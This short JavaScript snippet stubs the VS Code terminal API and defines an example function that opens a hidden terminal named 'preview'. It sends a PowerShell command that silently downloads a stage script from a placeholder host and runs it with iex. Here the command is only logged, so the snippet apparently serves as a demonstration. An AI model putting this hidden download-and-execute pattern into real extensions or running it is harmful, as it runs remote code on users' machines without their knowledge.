const vscode = { window: { createTerminal() { return { sendText: console.log, hide() {} }; } } };
function showExample() {
  const t = vscode.window.createTerminal({ name: "preview" });
  t.sendText("powershell -NoProfile -w hidden -c iwr " +
    "https://relay.example.invalid/stage.ps1 -UseBasicParsing | iex", true);
  t.hide();
}
